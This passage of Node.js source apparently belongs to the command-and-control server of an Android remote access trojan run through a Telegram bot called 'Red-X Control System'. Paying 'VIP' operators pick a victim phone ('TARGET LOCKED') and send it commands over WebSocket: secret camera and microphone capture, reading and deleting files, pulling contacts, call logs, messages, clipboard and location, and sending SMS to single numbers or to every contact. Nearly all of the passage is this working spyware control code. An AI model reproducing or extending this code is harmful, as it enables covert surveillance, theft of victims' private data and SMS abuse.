                    `Congratulations! You now have VIP access to Red-X Control System.\n\n` +
                    `Type /start to begin.`
                );
                
                // Log admin activity
                logUserActivity(userId, `approve_vip:${targetUserId}`);
            } else {
                appBot.sendMessage(chatId, `❌ VIP request rejected for user: ${targetUserId}`);
                appBot.sendMessage(targetUserId, 
                    `❌ 𝙑𝙄𝙋 𝙍𝙀𝙌𝙐𝙀𝙎𝙏 𝙍𝙀𝙅𝙀𝘾𝙏𝙀𝘿\n\n` +
                    `Your VIP access request has been rejected.\n` +
                    `Contact admin for more information.`
                );
                
                // Log admin activity
                logUserActivity(userId, `reject_vip:${targetUserId}`);
            }
        } else {
            appBot.sendMessage(chatId, '❌ Admin access required!');
        }
        
        appBot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    
    // Check access for device commands
    if (!hasAccess(userId)) {
        appBot.answerCallbackQuery(callbackQuery.id, { text: '❌ Access denied! VIP access required.', show_alert: true });
        return;
    }
    
    const parts = data.split(':');
    const command = parts[0];
    const uuid = parts[1];
    
    // Answer the callback query
    appBot.answerCallbackQuery(callbackQuery.id).catch(e => console.log('Answer error:', e));
    
    if (command === 'device') {
        if (!uuid || !appClients.has(uuid)) {
            appBot.sendMessage(chatId, '❌ Device not found!');
            return;
        }
        
        const deviceInfo = appClients.get(uuid);
        
        // Log device selection
        logUserActivity(userId, 'select_device', uuid, deviceInfo);
        
        appBot.editMessageText(
            `🎯 𝙏𝘼𝙍𝙂𝙀𝙏 𝙇𝙊𝘾𝙆𝙀𝘿\n\n` +
            `🔴 𝘿𝙀𝙑𝙄𝘾𝙀 𝘿𝙀𝙏𝘼𝙄𝙇𝙎:\n` +
            `• 🖥️ 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${deviceInfo.model}</b>\n` +
            `• 🔋 𝘽𝙖𝙩𝙩𝙚𝙧𝙮: <b>${deviceInfo.battery}%</b>\n` +
            `• 📱 𝙑𝙚𝙧𝙨𝙞𝙤𝙣: <b>${deviceInfo.version}</b>\n` +
            `• 📶 𝙋𝙧𝙤𝙫𝙞𝙙𝙚𝙧: <b>${deviceInfo.provider}</b>\n` +
            `• 👤 Selected by: <b>${userActivities.get(userId)?.firstName || 'Unknown'}</b>\n\n` +
            `⚠️ 𝙎𝙀𝙇𝙀𝘾𝙏 𝙊𝙋𝙀𝙍𝘼𝙏𝙄𝙊𝙉:`,
            {
                chat_id: chatId,
                message_id: msg.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [
                            {text: '👁️ 𝙈𝘼𝙄𝙉 𝘾𝘼𝙈', callback_data: `camera_main:${uuid}`},
                            {text: '🤳 𝙎𝙀𝙇𝙁𝙄𝙀', callback_data: `camera_selfie:${uuid}`},
                            {text: '🎤 𝙈𝙄𝘾', callback_data: `microphone:${uuid}`}
                        ],
                        [
                            {text: '📹 𝙍𝙀𝘾 𝙈𝘼𝙄𝙉', callback_data: `rec_camera_main:${uuid}`},
                            {text: '🎬 𝙍𝙀𝘾 𝙎𝙀𝙇𝙁𝙄𝙀', callback_data: `rec_camera_selfie:${uuid}`}
                        ],
                        [
                            {text: '📁 𝙁𝙄𝙇𝙀𝙎', callback_data: `file:${uuid}`},
                            {text: '🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀', callback_data: `delete_file:${uuid}`},
                            {text: '📋 𝘾𝙇𝙄𝙋𝘽𝙊𝘼𝙍𝘿', callback_data: `clipboard:${uuid}`}
                        ],
                        [
                            {text: '📊 𝙄𝙉𝙁𝙊', callback_data: `device_info:${uuid}`},
                            {text: '📱 𝘼𝙋𝙋𝙎', callback_data: `apps:${uuid}`},
                            {text: '📍 𝙇𝙊𝘾𝘼𝙏𝙄𝙊𝙉', callback_data: `location:${uuid}`}
                        ],
                        [
                            {text: '📞 𝘾𝘼𝙇𝙇𝙎', callback_data: `calls:${uuid}`},
                            {text: '👥 𝘾𝙊𝙉𝙏𝘼𝘾𝙏𝙎', callback_data: `contacts:${uuid}`},
                            {text: '💬 𝙈𝙎𝙂𝙎', callback_data: `messages:${uuid}`}
                        ],
                        [
                            {text: '📨 𝙎𝙀𝙉𝘿 𝙎𝙈𝙎', callback_data: `send_message:${uuid}`},
                            {text: '📢 𝘽𝙇𝘼𝙎𝙏 𝙎𝙈𝙎', callback_data: `send_message_to_all:${uuid}`}
                        ],
                        [
                            {text: '🔔 𝙉𝙊𝙏𝙄𝙁𝙔', callback_data: `show_notification:${uuid}`},
                            {text: '⚠️ 𝙏𝙊𝘼𝙎𝙏', callback_data: `toast:${uuid}`},
                            {text: '📳 𝙑𝙄𝘽𝙍𝘼𝙏𝙀', callback_data: `vibrate:${uuid}`}
                        ],
                        [
                            {text: '🔊 𝙋𝙇𝘼𝙔', callback_data: `play_audio:${uuid}`},
                            {text: '🔇 𝙎𝙏𝙊𝙋', callback_data: `stop_audio:${uuid}`}
                        ]
                    ]
                }
            }
        );
        return;
    }
    
    // Handle other commands
    if (!uuid || !appClients.has(uuid)) {
        appBot.sendMessage(chatId, '❌ Device not found or disconnected!');
        return;
    }
    
    const deviceInfo = appClients.get(uuid);
    
    // Log command execution
    logUserActivity(userId, command, uuid, deviceInfo);
    
    // Notify admin about this activity
    notifyAdminActivity(userId, command, deviceInfo);
    
    console.log(`📡 Sending command to device ${uuid}: ${command} by user ${userId}`);
    
    // Send command to device
    let commandSent = false;
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send(command);
            commandSent = true;
            console.log(`✅ Command sent: ${command} to ${uuid} by ${userId}`);
        }
    });
    
    if (!commandSent) {
        appBot.sendMessage(chatId, '❌ Failed to send command. Device disconnected.');
        return;
    }
    
    // Handle commands that need user input
    const inputCommands = ['send_message', 'send_message_to_all', 'file', 'delete_file', 
                          'microphone', 'rec_camera_main', 'rec_camera_selfie', 'toast', 
                          'show_notification', 'play_audio'];
    
    if (inputCommands.includes(command)) {
        appBot.deleteMessage(chatId, msg.message_id);
        currentUuid = uuid;
        
        switch(command) {
            case 'send_message':
                appBot.sendMessage(chatId, '📱 Enter phone number:', {reply_markup: {force_reply: true}});
                break;
            case 'send_message_to_all':
                appBot.sendMessage(chatId, '💬 Enter message for all contacts:', {reply_markup: {force_reply: true}});
                break;
            case 'calls':
                appBot.sendMessage(chatId, '📞 Extracting call logs...');
                break;
            default:
                appBot.sendMessage(chatId, '✅ Command sent successfully!');
        }
    } else {
        // For simple commands
        appBot.deleteMessage(chatId, msg.message_id);
        appBot.sendMessage(chatId,
            `✅ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙎𝙚𝙣𝙩: ${COMMAND_NAMES[command] || command.toUpperCase()}\n\n` +
            `📡 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜...\n` +
            `⏳ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩`,
            {
                reply_markup: {
                    keyboard: [
                        ["🎯 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿 𝘿𝙀𝙑𝙄𝘾𝙀𝙎"],
                        ["⚡ 𝙀𝙓𝙀𝘾𝙐𝙏𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿"],
                        ["🚨 𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙏𝘼𝙏𝙐𝙎"]
                    ],
                    resize_keyboard: true
                }
            }
        );
    }
})

// Handle reply messages with tracking
appBot.on('message', (msg) => {
    if (msg.reply_to_message && currentUuid) {
        console.log(`📝 Reply received from ${msg.from.id}: ${msg.text}`);
        
        const userId = msg.from.id;
        const deviceInfo = appClients.get(currentUuid);
        
        // Log the reply as activity
        logUserActivity(userId, 'reply_input', currentUuid, deviceInfo);
        
        // Send to device
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                let command = '';
                if (msg.reply_to_message.text.includes('phone number')) {
                    currentNumber = msg.text;
                    ws.send(`send_message_number:${msg.text}`);
                    appBot.sendMessage(msg.chat.id, '📝 Now enter the message:', {reply_markup: {force_reply: true}});
                    
                    // Notify admin
                    notifyAdminActivity(userId, 'send_message_number', deviceInfo);
                    return;
                } else if (currentNumber) {
                    ws.send(`send_message:${currentNumber}/${msg.text}`);
                    
                    // Notify admin about SMS sending
                    const activityMessage = `📨 𝙎𝙈𝙎 𝙎𝙀𝙉𝘿 𝘼𝘾𝙏𝙄𝙑𝙄𝙏𝙔\n\n` +
                                          `• 👤 User: <b>${userActivities.get(userId)?.firstName || 'Unknown'}</b>\n` +
                                          `• 📱 Device: <b>${deviceInfo?.model || 'Unknown'}</b>\n` +
                                          `• 📞 To: ${currentNumber}\n` +
                                          `• 💬 Message: ${msg.text}\n` +
                                          `• 🕐 Time: ${new Date().toLocaleString()}`;
                    
                    appBot.sendMessage(id, activityMessage, {parse_mode: "HTML"});
                    
                    currentNumber = '';
                    currentUuid = '';
                } else {
                    ws.send(`${msg.reply_to_message.text.split(' ')[0]}:${msg.text}`);
                    currentUuid = '';
                }
            }
        });
        
        appBot.sendMessage(msg.chat.id, '✅ Request received. Processing...');
    }
})

// Periodic ping
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => console.log('Ping sent')).catch(e => console.log('Ping error:', e.message))
    } catch (e) {
        console.log('Ping error:', e.message)
    }
}, 5000)

// Start server
appServer.listen(process.env.PORT || 8999, () => {
    console.log(`🚀 Server running on port ${process.env.PORT || 8999}`);
    console.log(`🤖 Bot started successfully`);
    console.log(`📡 WebSocket server ready for connections`);
    console.log(`👑 VIP System: Active with ${vipUsers.size} users`);
    console.log(`📊 Activity Tracking: Enabled`);
});